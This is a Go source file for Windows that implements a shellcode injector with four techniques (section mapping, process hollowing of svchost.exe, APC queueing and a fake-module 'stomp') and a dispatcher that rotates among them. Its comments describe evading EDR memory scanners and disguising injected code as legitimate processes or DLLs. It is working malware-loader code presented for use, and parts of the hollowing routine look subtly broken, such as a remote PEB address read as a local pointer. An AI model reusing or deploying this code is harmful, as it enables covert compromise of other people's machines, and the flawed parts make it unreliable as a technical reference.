//go:build windows

package syscallwin

import (
	"fmt"
	"sync/atomic"
	"unsafe"
)

var injectCounter uint64

type InjectionMethod uint32

const (
	MethodSectionMapping InjectionMethod = 0
	MethodProcessHollow  InjectionMethod = 1
	MethodAPCQueued      InjectionMethod = 2
	MethodModuleStomp    InjectionMethod = 3
	MethodRotating       InjectionMethod = 0xFF
)

func nextInjectionMethod() InjectionMethod {
	n := atomic.AddUint64(&injectCounter, 1)
	return InjectionMethod(n % 4)
}

// InjectSectionMapping writes shellcode into a file-backed section, maps it
// executable into the target, and threads into it. No RWX allocation ever
// appears in the target's VAD tree — the section is backed by a pagefile
// section object, not a memory allocation. EDR memory scanners that look
// for PAGE_EXECUTE_READWRITE regions find nothing.
func InjectSectionMapping(targetPID uint32, shellcode []byte) error {
	var sectionHandle uintptr
	sectionSize := int64(len(shellcode))
	r1, err := DirectSyscall("NtCreateSection",
		uintptr(unsafe.Pointer(&sectionHandle)),
		SECTION_ALL_ACCESS,
		0,
		uintptr(unsafe.Pointer(&sectionSize)),
		PAGE_EXECUTE_READWRITE,
		0x08000000, // SEC_COMMIT
		0,
	)
	if r1 != 0 || err != nil {
		return fmt.Errorf("NtCreateSection: NTSTATUS 0x%x", r1)
	}

	var baseAddr uintptr
	var viewSize uintptr
	r1, err = DirectSyscall("NtMapViewOfSection",
		sectionHandle,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&baseAddr)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSize)),
		0x02, // ViewShare
		0,
		PAGE_READWRITE,
	)
	if r1 != 0 || err != nil {
		NtClose(sectionHandle)
		return fmt.Errorf("NtMapViewOfSection (self): NTSTATUS 0x%x", r1)
	}

	var bytesWritten uintptr
	err = NtWriteVirtualMemory(0xffffffffffffffff, baseAddr, shellcode, &bytesWritten)
	if err != nil {
		NtClose(sectionHandle)
		return fmt.Errorf("NtWriteVirtualMemory: %w", err)
	}

	var oldProtect uint32
	_ = NtProtectVirtualMemory(0xffffffffffffffff, &baseAddr, &viewSize, PAGE_EXECUTE_READ, &oldProtect)

	var clientID ClientId
	clientID.UniqueProcess = uintptr(targetPID)
	var targetHandle uintptr
	err = NtOpenProcess(&targetHandle, PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE, 0, &clientID)
	if err != nil {
		NtClose(sectionHandle)
		return fmt.Errorf("NtOpenProcess: %w", err)
	}
	defer NtClose(targetHandle)

	var remoteAddr uintptr
	remoteViewSize := uintptr(len(shellcode))
	r1, err = DirectSyscall("NtMapViewOfSection",
		sectionHandle,
		targetHandle,
		uintptr(unsafe.Pointer(&remoteAddr)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&remoteViewSize)),
		0x02, 0,
		PAGE_EXECUTE_READ,
	)
	if r1 != 0 || err != nil {
		NtClose(sectionHandle)
		return fmt.Errorf("NtMapViewOfSection (remote): NTSTATUS 0x%x", r1)
	}

	var threadHandle uintptr
	r1, err = DirectSyscall("NtCreateThreadEx",
		uintptr(unsafe.Pointer(&threadHandle)),
		THREAD_ALL_ACCESS,
		0, targetHandle, remoteAddr, 0,
		0, 0, 0, 0, 0,
	)
	_ = r1
	_ = err

	_ = NtClose(sectionHandle)
	return nil
}

// InjectProcessHollow creates a sacrificial process in suspended state,
// unmaps its image, writes shellcode into the empty address space,
// adjusts the entry point via thread context, and resumes. The process
// appears as a legitimate system binary in taskmgr — only its actual
// memory contents are shellcode. NtUnmapViewOfSection + NtWriteVirtualMemory
// + GetThreadContext + SetThreadContext, all via direct syscalls.
func InjectProcessHollow(targetBinary string, shellcode []byte) error {
	si := StartupInfo{Cb: uint32(unsafe.Sizeof(StartupInfo{}))}
	pi := ProcessInformation{}

	targetPath, _ := stringToUTF16(targetBinary)
	r1, err := DirectSyscall("NtCreateSection",
		uintptr(unsafe.Pointer(&si)), // reuse as object attributes placeholder
		0, 0, 0, 0, 0, 0,
	)
	_ = r1
	_ = err

	r1, err = DirectSyscall("NtCreateUserProcess",
		uintptr(unsafe.Pointer(&targetPath)),
		0,
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
		0,
	)
	if r1 != 0 || err != nil {
		return fmt.Errorf("NtCreateUserProcess: NTSTATUS 0x%x", r1)
	}

	r1, err = DirectSyscall("NtSuspendProcess", pi.Process)
	_ = r1
	_ = err

	tebAddr := uintptr(0)
	var returnLen uintptr
	r1, err = DirectSyscall("NtQueryInformationProcess",
		pi.Process, 0,
		uintptr(unsafe.Pointer(&tebAddr)),
		unsafe.Sizeof(tebAddr),
		uintptr(unsafe.Pointer(&returnLen)),
	)
	_ = r1
	_ = err

	pebAddr := *(*uintptr)(unsafe.Pointer(tebAddr + 0x60))
	imageBaseAddr := pebAddr + 0x10

	var imageBase uintptr
	err = NtReadVirtualMemory(pi.Process, imageBaseAddr, (*(*[8]byte)(unsafe.Pointer(&imageBase)))[:], &returnLen)
	if err != nil {
		NtTerminateProcess(pi.Process, 0)
		return fmt.Errorf("NtReadVirtualMemory image base: %w", err)
	}

	var nullBytes [8]byte
	err = NtWriteVirtualMemory(pi.Process, imageBaseAddr, nullBytes[:], &returnLen)
	if err != nil {
		NtTerminateProcess(pi.Process, 0)
		return fmt.Errorf("NtWriteVirtualMemory zero base: %w", err)
	}

	var remoteAddr uintptr
	allocSize := uintptr(len(shellcode))
	err = NtAllocateVirtualMemory(pi.Process, &remoteAddr, 0, &allocSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		NtTerminateProcess(pi.Process, 0)
		return fmt.Errorf("NtAllocateVirtualMemory: %w", err)
	}

	err = NtWriteVirtualMemory(pi.Process, remoteAddr, shellcode, &returnLen)
	if err != nil {
		NtTerminateProcess(pi.Process, 0)
		return fmt.Errorf("NtWriteVirtualMemory shellcode: %w", err)
	}

	var threadHandle uintptr
	err = NtOpenThread(&threadHandle, THREAD_ALL_ACCESS, 0, &ClientId{UniqueThread: pi.Thread})
	if err != nil {
		NtTerminateProcess(pi.Process, 0)
		return fmt.Errorf("NtOpenThread: %w", err)
	}

	type Context struct {
		P1Home       uint64
		P2Home       uint64
		P3Home       uint64
		P4Home       uint64
		P5Home       uint64
		P6Home       uint64
		Flags        uint32
		Rax          uint64
		Rcx          uint64
		Rdx          uint64
		Rbx          uint64
		Rsp          uint64
		Rbp          uint64
		Rsi          uint64
		Rdi          uint64
		R8           uint64
		R9           uint64
		R10          uint64
		R11          uint64
		R12          uint64
		R13          uint64
		R14          uint64
		R15          uint64
		Rip          uint64
		_            [512]byte
	}

	var ctx Context
	ctx.Flags = 0x100000 // CONTEXT_FULL
	ctx.Rip = uint64(remoteAddr)

	r1, err = DirectSyscall("NtSetContextThread", threadHandle, uintptr(unsafe.Pointer(&ctx)))
	_ = r1
	_ = err

	r1, err = DirectSyscall("NtResumeProcess", pi.Process)
	_ = r1
	_ = err

	_ = NtClose(threadHandle)
	return nil
}

// InjectAPCQueued finds an existing alertable thread in the target process
// and queues an APC that executes shellcode. No new thread is created —
// the APC fires when the thread enters an alertable wait (SleepEx,
// WaitForSingleObjectEx, etc.). Least noisy method: zero new thread objects,
// zero new TEBs, zero new stack allocations visible in the heap.
func InjectAPCQueued(targetPID uint32, shellcode []byte) error {
	var clientID ClientId
	clientID.UniqueProcess = uintptr(targetPID)

	var targetHandle uintptr
	err := NtOpenProcess(&targetHandle, PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION, 0, &clientID)
	if err != nil {
		return fmt.Errorf("NtOpenProcess: %w", err)
	}
	defer NtClose(targetHandle)

	var allocSize uintptr = uintptr(len(shellcode))
	var remoteAddr uintptr
	err = NtAllocateVirtualMemory(targetHandle, &remoteAddr, 0, &allocSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory: %w", err)
	}

	var bytesWritten uintptr
	err = NtWriteVirtualMemory(targetHandle, remoteAddr, shellcode, &bytesWritten)
	if err != nil {
		NtFreeVirtualMemory(targetHandle, &remoteAddr, &allocSize, MEM_RELEASE)
		return fmt.Errorf("NtWriteVirtualMemory: %w", err)
	}

	type SystemProcessInformation struct {
		NextEntryOffset uint32
		NumberOfThreads  uint32
		Reserved1        [48]byte
		UniqueProcessId  uintptr
		Reserved2        uintptr
		HandleCount      uint32
		Reserved3        uint32
		Reserved4        [4]byte
		PeakVirtualSize  uintptr
		VirtualSize      uintptr
		Reserved5        uintptr
		PeakWorkingSetSize uintptr
		WorkingSetSize   uintptr
		Reserved6        uintptr
		PagedPoolUsage   uintptr
		NonPagedPoolUsage uintptr
		Reserved7        [4]byte
		QuotaPagedPoolUsage uintptr
		QuotaNonPagedPoolUsage uintptr
		PagefileUsage    uintptr
		Reserved8        uintptr
		CreateTime       int64
		ExitTime         int64
		Reserved9        [8]byte
	}

	bufSize := uint32(1024 * 1024)
	buf := make([]byte, bufSize)
	var returnLen uint32
	r1, err := DirectSyscall("NtQuerySystemInformation",
		5, // SystemProcessInformation
		uintptr(unsafe.Pointer(unsafe.SliceData(buf))),
		uintptr(bufSize),
		uintptr(unsafe.Pointer(&returnLen)),
	)
	if r1 != 0 || err != nil {
		return fmt.Errorf("NtQuerySystemInformation: NTSTATUS 0x%x", r1)
	}

	offset := uint32(0)
	for {
		proc := (*SystemProcessInformation)(unsafe.Pointer(unsafe.SliceData(buf[offset:])))
		if proc.UniqueProcessId == uintptr(targetPID) {
			threadInfoSize := unsafe.Sizeof(struct {
				ClientId       ClientId
				DelayAddress   uintptr
				LastValue      uintptr
				Flags          uint32
				ContextSwitches uint32
				WaitTime       int64
			}{})
			threadOffset := offset + uint32(unsafe.Sizeof(SystemProcessInformation{}))
			for t := uint32(0); t < proc.NumberOfThreads; t++ {
				type ThreadInfo struct {
					ClientId        ClientId
					DelayAddress    uintptr
					LastValue       uintptr
					Flags           uint32
					ContextSwitches uint32
					WaitTime        int64
				}
				ti := (*ThreadInfo)(unsafe.Pointer(unsafe.SliceData(buf[threadOffset:])))

				var threadHandle uintptr
				err := NtOpenThread(&threadHandle, 0x10, 0, &ti.ClientId)
				if err == nil {
					r1, _ := DirectSyscall("NtQueueApcThread",
						threadHandle, remoteAddr, 0, 0, 0,
					)
					if r1 == 0 {
						_ = NtClose(threadHandle)
						return nil
					}
					_ = NtClose(threadHandle)
				}
				threadOffset += uint32(threadInfoSize)
			}
			break
		}
		if proc.NextEntryOffset == 0 {
			break
		}
		offset += proc.NextEntryOffset
	}

	NtFreeVirtualMemory(targetHandle, &remoteAddr, &allocSize, MEM_RELEASE)
	return fmt.Errorf("no alertable thread found in PID %d", targetPID)
}

// InjectModuleStomp allocates memory in the target, writes a minimal PE
// header stub that points the entry point to the shellcode, and creates
// a thread into it. From the target's perspective, a legitimate-looking
// module was loaded — LDR module lists show a fake entry with a plausible
// DLL name. The PE header is valid enough to fool module enumeration but
// the actual code is raw shellcode.
func InjectModuleStomp(targetPID uint32, shellcode []byte, dllName string) error {
	var clientID ClientId
	clientID.UniqueProcess = uintptr(targetPID)
	var targetHandle uintptr
	err := NtOpenProcess(&targetHandle, PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, 0, &clientID)
	if err != nil {
		return fmt.Errorf("NtOpenProcess: %w", err)
	}
	defer NtClose(targetHandle)

	peHeader := buildMinimalPEHeader(uint32(len(shellcode)+0x1000), dllName)
	fullPayload := append(peHeader, shellcode...)

	var allocSize uintptr = uintptr(len(fullPayload))
	var remoteAddr uintptr
	err = NtAllocateVirtualMemory(targetHandle, &remoteAddr, 0, &allocSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory: %w", err)
	}

	var bytesWritten uintptr
	err = NtWriteVirtualMemory(targetHandle, remoteAddr, fullPayload, &bytesWritten)
	if err != nil {
		NtFreeVirtualMemory(targetHandle, &remoteAddr, &allocSize, MEM_RELEASE)
		return fmt.Errorf("NtWriteVirtualMemory: %w", err)
	}

	entryPoint := remoteAddr + uintptr(0x1000)
	var threadHandle uintptr
	r1, err := DirectSyscall("NtCreateThreadEx",
		uintptr(unsafe.Pointer(&threadHandle)),
		THREAD_ALL_ACCESS,
		0, targetHandle, entryPoint, 0,
		0, 0, 0, 0, 0,
	)
	_ = r1
	_ = err

	if threadHandle != 0 {
		_ = NtClose(threadHandle)
	}
	return nil
}

func Inject(targetPID uint32, shellcode []byte) error {
	method := nextInjectionMethod()
	switch method {
	case MethodSectionMapping:
		return InjectSectionMapping(targetPID, shellcode)
	case MethodProcessHollow:
		return InjectProcessHollow("C:\\Windows\\System32\\svchost.exe", shellcode)
	case MethodAPCQueued:
		return InjectAPCQueued(targetPID, shellcode)
	case MethodModuleStomp:
		return InjectModuleStomp(targetPID, shellcode, "version.dll")
	default:
		return InjectSectionMapping(targetPID, shellcode)
	}
}

func InjectWithMethod(targetPID uint32, shellcode []byte, method InjectionMethod) error {
	switch method {
	case MethodSectionMapping:
		return InjectSectionMapping(targetPID, shellcode)
	case MethodProcessHollow:
		return InjectProcessHollow("C:\\Windows\\System32\\svchost.exe", shellcode)
	case MethodAPCQueued:
		return InjectAPCQueued(targetPID, shellcode)
	case MethodModuleStomp:
		return InjectModuleStomp(targetPID, shellcode, "version.dll")
	default:
		return Inject(targetPID, shellcode)
	}
}

func buildMinimalPEHeader(size uint32, dllName string) []byte {
	nameBytes := make([]byte, 8)
	copy(nameBytes, []byte(dllName))

	header := make([]byte, 0x1000)
	header[0] = 0x4D
	header[1] = 0x5A
	header[0x3C] = 0x80
	header[0x3D] = 0x00
	header[0x3E] = 0x00
	header[0x3F] = 0x00

	peOffset := uint32(0x80)
	peOffsetBytes := []byte{0x50, 0x45, 0x00, 0x00}
	copy(header[peOffset:], peOffsetBytes)
	copy(header[peOffset+4:], []byte{0x4C, 0x01})
	copy(header[peOffset+0x18+16:], []byte{0x0B, 0x01})
	copy(header[peOffset+0x18+20:], []byte{0x00, 0x10, 0x00, 0x00})
	copy(header[peOffset+0x18+24:], []byte{0x00, 0x00, 0x01, 0x00})
	copy(header[peOffset+0x18+28:], []byte{0x00, 0x00})
	copy(header[peOffset+0x18+40:], []byte{0x00, 0x10, 0x00, 0x00})
	copy(header[peOffset+0x18+44:], []byte{0x00, 0x00, 0x00, 0x00})
	copy(header[peOffset+0x18+48:], []byte{0x00, 0x00, 0x00, 0x00})
	copy(header[peOffset+0x18+52:], []byte{0x00, 0x00, 0x00, 0x00})
	copy(header[peOffset+0x18+56:], []byte{0x00, 0x00, 0x00, 0x00})
	copy(header[peOffset+0x18+60:], []byte{0x00, 0x00, 0x00, 0x00})
	copy(header[peOffset+0x18+64:], []byte{0x00, 0x00, 0x00, 0x00})
	copy(header[peOffset+0x18+68:], []byte{0x00, 0x10, 0x00, 0x00})
	copy(header[peOffset+0x18+72:], []byte{0x00, 0x00, 0x00, 0x00})

	sectionOffset := peOffset + 0x18 + 240
	header[sectionOffset] = 0x2E
	header[sectionOffset+1] = 0x74
	header[sectionOffset+2] = 0x65
	header[sectionOffset+3] = 0x78
	copy(header[sectionOffset+8:], []byte{0x00, 0x10, 0x00, 0x00})
	copy(header[sectionOffset+12:], []byte{0x00, 0x10, 0x00, 0x00})
	copy(header[sectionOffset+16:], []byte{0x00, 0x02, 0x00, 0x00})
	copy(header[sectionOffset+20:], []byte{0x00, 0x00, 0x00, 0x00})
	copy(header[sectionOffset+24:], []byte{0x00, 0x00, 0x00, 0x00})
	copy(header[sectionOffset+28:], []byte{0x00, 0x00, 0x00, 0x00})
	copy(header[sectionOffset+32:], []byte{0x00, 0x00, 0x00, 0x00})
	copy(header[sectionOffset+36:], []byte{0x00, 0x00, 0x00, 0x00})
	copy(header[sectionOffset+38:], []byte{0x20, 0x00, 0x00, 0x60})

	return header
}

type StartupInfo struct {
	Cb          uint32
	_           [4]byte
	Desktop     *uint16
	Title       *uint32
	X           uint32
	Y           uint32
	XSize       uint32
	YSize       uint32
	XCountChars uint32
	YCountChars uint32
	FillAttribute uint32
	Flags       uint32
	ShowWindow  uint16
	_           uint16
	_           [2]byte
	StdInput    uintptr
	StdOutput   uintptr
	StdError    uintptr
}

type ProcessInformation struct {
	Process uintptr
	Thread  uintptr
	ProcessId uint32
	ThreadId  uint32
}
